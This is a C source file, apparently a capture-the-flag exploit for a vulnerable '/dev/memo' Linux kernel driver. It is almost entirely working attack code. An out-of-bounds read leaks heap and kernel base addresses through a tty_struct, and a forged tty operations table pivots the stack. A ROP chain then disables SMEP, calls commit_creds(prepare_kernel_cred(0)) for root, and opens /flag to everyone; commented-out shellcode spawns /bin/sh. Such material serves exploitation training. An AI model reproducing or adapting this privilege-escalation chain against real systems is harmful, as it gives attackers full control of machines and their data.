#include <stdio.h>
#include <stdarg.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sched.h>
#include <errno.h>
#include <pty.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/sem.h>


#define KERNELCALL __attribute__ ((regparm(3)))
void (* commit_creds)(void *) KERNELCALL;
size_t* (* prepare_kernel_cred)(void *) KERNELCALL;
size_t commit_creds_addr=0,prepare_kernel_cred_addr=0;

struct skewBuf{
	unsigned char padding;
	unsigned long vec[127];
	unsigned char pading[7];
} __attribute__((packed));

void info(const char *fmt, ...) {
	va_list args;
	va_start(args, fmt);
	fprintf(stdout, "[.] ");
	vfprintf(stdout, fmt, args);
	va_end(args);
}

void msg(const char *fmt, ...) {
	va_list args;
	va_start(args, fmt);
	fprintf(stdout, "[*] ");
	vfprintf(stdout, fmt, args);
	va_end(args);
}

void fail(const char *fmt, ...) {
	va_list args;
	va_start(args, fmt);
	fprintf(stdout, "[x] ");
	vfprintf(stdout, fmt, args);
	va_end(args);
	exit(1);
}

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
        //info("saving status...\n");
        __asm__("mov user_cs, cs;"
                        "mov user_ss, ss;"
                        "mov user_sp, rsp;"
                        "pushf;"
                        "pop user_rflags;"
                        );
        //msg("status has been saved\n");
}

void get_shell(){
        msg("shell?\n");
        char *shell = "/bin/sh";
        char *args[] = {shell,NULL};
        execve(shell,args,NULL);
}

void get_root(){
	commit_creds = commit_creds_addr;
	prepare_kernel_cred = prepare_kernel_cred_addr;
	commit_creds(prepare_kernel_cred(0));
}

void mod_write(int fd,void* buf,size_t nbyte){
	size_t result;
	//info("mod_write ... \n");
	result = write(fd,buf,nbyte);
	if(result<=0){
		fail("mod_write failed!\n");
		exit(-1);
	}
}

void mod_llseek(int fd,off_t offset, int whence){
	size_t result;
	//info("mod_llseek ... \n");
	result = lseek(fd,offset,whence);
	//msg("mod_llseek result:0x%lx\n",result);
}


void mod_read(int fd,void *buf,size_t nbyte){
	size_t result;
	//info("mod_read ... \n");
	result = read(fd,buf,nbyte);
	if(result<=0){
		fail("mod_read failed!\n");
		exit(-1);
	}
}

size_t vmlinux_base = 0;
size_t raw_vmlinux_base = 0xffffffff81000000;
size_t raw_do_tty_hangup = 0xffffffff8140f6b0; 
size_t raw_commit_creds = 0xffffffff8107b8b0; 
size_t raw_prepare_kernel_cred = 0xffffffff8107bb50;
size_t raw_regcache_mark_dirty = 0xffffffff81588fd0;
size_t raw_x64_sys_chmod = 0xffffffff8119fcd0;
size_t raw_msleep = 0xffffffff810c4740;

size_t raw_mov_cr4_rdi = 0xffffffff8104b6a1;  //mov cr4, rdi; push rdx; popfq; ret;
size_t raw_xchg_eax_esp = 0xffffffff81012296; //xchg eax, esp; ret;
size_t raw_swapgs = 0xffffffff81a00e1a; //swapgs; popfq; ret;
size_t raw_iretq = 0xffffffff81020b12; //iretq; ret;
size_t raw_pop_rdi = 0xffffffff81001268; //pop rdi; ret;
size_t raw_pop_rdx = 0xffffffff81043137; //pop rdx; ret;
size_t raw_pop_rcx = 0xffffffff8104c852; //pop rcx; ret;
size_t raw_mov_rdi_rax = 0xffffffff810cecce; //mov rdi, rax; cmp r8, rdx; jne 0x2cecb3; ret; 
size_t raw_pop_rax = 0xffffffff81023301;//pop rax; ret;
size_t raw_mov_rdi_rbx = 0xffffffff827862bc; //mov rdi, rbx; call rax;
//size_t raw_push_rax = 0xffffffff8127624c; //push rax; jmp rcx;
size_t raw_pop_rsi = 0xffffffff81001b79; //pop rsi; ret;
size_t raw_push_rax =  0xffffffff81022353;//push rax; ret;
size_t raw_pop_rdi_call = 0xffffffff81f234e2; //pop rdi; call rcx;

size_t base_add(size_t addr){
	return addr - raw_vmlinux_base + vmlinux_base;
}

int main(){
	
	char tmp_buf[0x3ff];
	struct skewBuf buf;
	int i;
	size_t rop[0x50];
	/*char shellcode[0x50]="jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05";
	char gadget[0x10] = "H\x89\xc7\xff\xd2";*/

	char* flag_str = "/flag";

	save_status();
       	size_t fd = open("/dev/memo",O_RDWR);
	if(fd == -1){
		fail("memo open failed!\n");
	}
	
	memset(tmp_buf,'A',sizeof(tmp_buf));
	mod_write(fd,tmp_buf,sizeof(tmp_buf));
	
	mod_read(fd,&buf,sizeof(buf));
	size_t heap_addr = buf.vec[0]-0x400;
	msg("leak heap addr: %p\n",(void*)heap_addr);

	size_t tty_fd = open("/dev/ptmx",O_RDWR|O_NOCTTY);
	if(tty_fd == -1){
		fail("ptmx open failed!\n");
	}
	
	mod_llseek(fd,0x3ff,0);
	mod_read(fd,&buf,sizeof(buf));
	size_t do_tty_hangup = buf.vec[0x4a];
	vmlinux_base = do_tty_hangup - raw_do_tty_hangup + raw_vmlinux_base;
	msg("do_tty_hangup addr: %p\n",(void*)do_tty_hangup);
	msg("vmlinux_base addr: %p\n",(void*)vmlinux_base);
	

	mod_llseek(fd,0x3ff,0);
	size_t rop_base = heap_addr+0x2e0;
	buf.vec[3] = rop_base;
	buf.vec[0x2e0/8+0xc] = base_add(raw_regcache_mark_dirty);//ioctl
	buf.vec[0x20/8] = base_add(raw_mov_cr4_rdi);
	buf.vec[0x30/8] = 0x6f0;
	size_t xchg_eax_esp = base_add(raw_xchg_eax_esp);
	buf.vec[0x28/8] = xchg_eax_esp;

	size_t base = xchg_eax_esp & 0xfffff000;
	if(base != mmap(base,0x3000,7,MAP_PRIVATE | MAP_ANONYMOUS,-1,0)){
		fail("mmap failed!\n");
		exit(-1);
	}
	msg("base address:0x%llx\n",base);
	size_t swapgs = base_add(raw_swapgs);
	size_t iretq = base_add(raw_iretq);
	size_t pop_rdi = base_add(raw_pop_rdi);
	size_t pop_rdx = base_add(raw_pop_rdx);
	size_t pop_rcx = base_add(raw_pop_rcx);
	size_t pop_rax = base_add(raw_pop_rax);
	size_t mov_rdi_rax = base_add(raw_mov_rdi_rax);
	size_t mov_rdi_rbx = base_add(raw_mov_rdi_rbx);
	size_t push_rax = base_add(raw_push_rax);
	size_t pop_rsi = base_add(raw_pop_rsi);
	size_t pop_rdi_call = base_add(raw_pop_rdi_call);

	commit_creds_addr = base_add(raw_commit_creds);
	prepare_kernel_cred_addr = base_add(raw_prepare_kernel_cred);

	//memcpy(base+0x100,gadget,sizeof(gadget));
	//memcpy(base +0x200,shellcode,sizeof(shellcode));
	i=0;
	rop[i++] = pop_rdi;
	rop[i++] = 0;
	rop[i++] = prepare_kernel_cred_addr;
	rop[i++] = pop_rdx;
	rop[i++] = 0x100000001;
	rop[i++] = mov_rdi_rax;
	rop[i++] = commit_creds_addr;
	rop[i++] = pop_rdi;
	rop[i++] = 0xffffff9c;
	rop[i++] = pop_rsi;
	rop[i++] = flag_str;
	rop[i++] = pop_rdx;
	rop[i++] = 0777;
	rop[i++] = base_add(raw_x64_sys_chmod)+0xd;
	rop[i++] = pop_rdi;
	rop[i++] = 0x1000000;
	rop[i++] = base_add(raw_msleep);

	/*rop[i++] = swapgs;
	rop[i++] = 0;
	rop[i++] = iretq;
	rop[i++] = (size_t)(base+0x200);
	//rop[i++] = (size_t)get_shell;
	rop[i++] = user_cs;
	rop[i++] = user_rflags;
	rop[i++] = base+0x1000;
	rop[i++] = user_ss;*/
	memcpy(xchg_eax_esp & 0xffffffff,rop,sizeof(rop));

	mod_write(fd,&buf,sizeof(buf));	
	ioctl(tty_fd,0,0);
	//get_shell();	
	//mod_llseek(fd,0x3ff,0);

		
	return 0;
}
